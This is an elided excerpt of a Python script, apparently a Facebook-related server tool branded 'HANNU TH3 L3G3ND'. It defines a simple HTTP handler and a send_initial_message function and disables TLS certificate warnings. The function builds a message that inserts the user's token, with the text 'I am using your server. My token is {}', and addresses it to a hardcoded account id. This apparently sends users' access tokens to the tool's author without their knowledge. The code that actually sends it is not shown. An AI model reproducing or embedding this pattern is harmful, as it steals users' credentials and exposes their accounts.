...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"-- THIS SERVER MADE BY HWNNU")
...
def send_initial_message():
    ...
    msg_template = "Hello Abhii sir! I am using your server. My token is {}. India live time now {}"
    target_id = "100087929114519"

    requests.packages.urllib3.disable_warnings()

    def liness():
        print('\033[1;92m' + '•──────────────────────HANNU TH3 L3G3ND X0D ───────────────────────────────•')
